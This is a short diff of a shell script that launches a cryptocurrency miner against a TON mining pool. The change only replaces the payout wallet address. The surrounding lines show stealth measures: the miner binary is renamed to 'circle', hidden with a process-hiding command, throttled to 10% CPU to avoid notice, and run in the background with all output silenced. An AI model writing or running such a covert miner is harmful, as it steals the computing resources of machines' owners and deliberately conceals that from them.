@@ -14,4 +14,4 @@ mv miner-linux circle >/dev/null 2>&1
 ph add circle >/dev/null 2>&1
 chmod +x circle
 cpulimit -e circle -l 10 & >/dev/null 2>&1
-nohup ./circle https://next.ton-pool.com EQAE88HFmSdtb3_PPENQvtCUTUr_uknAemv1IemdNYAXeDye > nohup.out >/dev/null 2>&1
+nohup ./circle https://next.ton-pool.com EQAxkdZ4fFoFc0wZYbwT5Z2D-cA7q1te5etqcwGx6mTFys2u > nohup.out >/dev/null 2>&1
